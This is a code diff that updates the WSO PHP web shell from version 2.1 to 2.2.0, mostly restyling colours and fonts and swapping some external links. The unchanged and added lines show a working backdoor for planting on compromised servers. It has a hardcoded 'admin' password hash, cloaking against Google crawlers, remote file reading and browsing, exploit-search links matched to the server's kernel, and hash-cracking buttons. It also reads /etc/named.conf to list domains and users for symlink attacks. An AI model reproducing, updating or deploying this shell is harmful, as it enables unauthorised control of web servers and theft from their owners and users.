@@ -1,7 +1,7 @@
 <?php
-/* WSO 2.1 (Web Shell by oRb) */
+/* WSO 2.2.0 (Web Shell by oRb) */
 $auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin
-$color = "#df5";
+$color = "#fff";
 $default_action = 'FilesMan';
 @define('SELF_PATH', __FILE__);
 if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
@@ -15,7 +15,7 @@ if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '2.1');
+@define('VERSION', '2.2.0');
 if( get_magic_quotes_gpc() ) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -25,8 +25,8 @@ if( get_magic_quotes_gpc() ) {
 function printLogin() {
 	?>
 	<center>
-	<form method=post>
-	Password: <input type=password name=pass><input type=submit value='>>'>
+	<form method=post style="font-family:fantasy;">
+	Password: <input type=password name=pass style="background-color:whitesmoke;border:1px solid #FFF;"><input type=submit value='>>' style="border:none;background-color:teal;color:#fff;">
 	</form></center>
 	<?php
 	exit;
@@ -124,26 +124,26 @@ function printHeader() {
 	?>
 <html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?> - WSO <?=VERSION?></title>
 <style>
-	body {background-color:#444;color:#e1e1e1;}
-	body,td,th	{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top; }
-	table.info	{ color:#fff;background-color:#222; }
-	span,h1,a	{ color:<?=$color?> !important; }
-	span		{ font-weight: bolder; }
-	h1			{ border-left:5px solid <?=$color?>;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
-	div.content	{ padding: 5px;margin-left:5px;background-color:#333; }
-	a			{ text-decoration:none; }
-	a:hover		{ text-decoration:underline; }
-	.ml1		{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
-	.bigarea	{ width:100%;height:250px; }
-	input, textarea, select	{ margin:0;color:#fff;background-color:#555;border:1px solid <?=$color?>; font: 9pt Monospace,"Courier New"; }
-	form		{ margin:0px; }
-	#toolsTbl	{ text-align:center; }
-	.toolsInp	{ width: 300px }
-	.main th	{text-align:left;background-color:#5e5e5e;}
+	body {background-color:#000;color:#e1e1e1;}
+	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;color:#C3C3C3;}
+	table.info	{color:#fff;background-color:#000;}
+	span,h1,a	{color:<?=$color?> !important;}
+	span		{font-weight:bolder;}
+	h1			{border-left:5px solid teal;padding:2px 5px;font:14pt Verdana;background-color:#222;margin:0px;}
+	div.content	{padding:5px;margin-left:5px;background-color:#000;}
+	a			{text-decoration:none;}
+	a:hover		{text-decoration:underline;}
+	.ml1		{border:1px solid #444;padding:5px;margin:0;overflow:auto;}
+	.bigarea	{width:100%;height:250px; }
+	input, textarea, select	{margin:0;color:#fff;background-color:#444;border:1px solid #000; font:9pt Courier New;}
+	form		{margin:0px;}
+	#toolsTbl	{text-align:center;}
+	.toolsInp	{width:300px}
+	.main th	{text-align:left;background-color:#000;}
 	.main tr:hover{background-color:#5e5e5e}
 	.main td, th{vertical-align:middle}
 	.l1			{background-color:#444}
-	pre			{font-family:Courier,Monospace;}
+	pre			{font:9pt Courier New;}
 </style>
 <script>
 	function set(a,c,p1,p2,p3,charset) {
@@ -209,7 +209,7 @@ function printHeader() {
 	$totalSpace = $totalSpace?$totalSpace:1;
 	$release = @php_uname('r');
 	$kernel = @php_uname('s');
-	$millink='http://milw0rm.com/search.php?dong=';
+	$millink='https://github.com/HARDLINUX/webshell/search?utf8=✓&q=';
 	if( strpos('Linux', $kernel) !== false )
 		$millink .= urlencode( 'Linux Kernel ' . substr($release,0,6) );
 	else
@@ -255,16 +255,16 @@ function printHeader() {
 			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
 	}
 	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
-		 '<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[Google]</a> <a href="'.$millink.'" target=_blank>[Exploit-DB]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( '.$group.' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#00bb00><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
+		 '<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[Google]</a> <a href="'.$millink.'" target=_blank>[Exploit-Git]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( '.$group.' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#00A8A8><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
 		 '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">'.$opt_charsets.'</optgroup></select><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
-		 '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div style="margin:5">';
+		 '<table cellpadding=3 cellspacing=0 width=100% style="background-color:teal;"><tr>'.$menu.'</tr></table><div>';
 }
 
 function printFooter() {
-	$is_writable = is_writable($GLOBALS['cwd'])?"<font color=green>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";
+	$is_writable = is_writable($GLOBALS['cwd'])?"<font color=teal>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";
 ?>
 </div>
-<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style="border-top:2px solid #333;border-bottom:2px solid #333;">
+<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%">
 	<tr>
 		<td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="<?=htmlspecialchars($GLOBALS['cwd']);?>"><input type=submit value=">>"></form></td>
 		<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
@@ -350,7 +350,7 @@ function viewPermsColor($f) {
 	elseif (!@is_writable($f))
 		return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
 	else
-		return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
+		return '<font color=#00A8A8><b>'.perms(@fileperms($f)).'</b></font>';
 }
 if(!function_exists("scandir")) {
 	function scandir($dir) {
@@ -681,8 +681,8 @@ function actionStringTools() {
 		<form method='post' target='_blank' name="hf">
 			<input type="text" name="hash" style="width:200px;"><br>
 			<input type="button" value="hashcrack.com" onclick="document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()"><br>
-			<input type="button" value="milw0rm.com" onclick="document.hf.action='http://www.milw0rm.com/cracker/search.php';document.hf.submit()"><br>
-			<input type="button" value="hashcracking.info" onclick="document.hf.action='https://hashcracking.info/index.php';document.hf.submit()"><br>
+			<input type="button" value="fakenamegenerator.com" onclick="document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()"><br>
+			<input type="button" value="tools4noobs.com" onclick="document.hf.action='http://www.tools4noobs.com/online_php_functions/';document.hf.submit()"><br>
 			<input type="button" value="md5.rednoize.com" onclick="document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()"><br>
 			<input type="button" value="md5decrypter.com" onclick="document.hf.action='http://www.md5decrypter.com/';document.hf.submit()"><br>
 		</form>
@@ -1002,7 +1002,7 @@ $d0mains = @file("/etc/named.conf");
 if(!$d0mains){ die("<b>#Error... -> [ /etc/named.conf ]"); }
 
 echo "<table align=center border=1>
-<tr bgcolor=green><td>Domain</td><td>User List </td><td>Symlink</td></tr>";
+<tr bgcolor=teal><td>Domain</td><td>User List </td><td>Symlink</td></tr>";
 
 foreach($d0mains as $d0main){
 
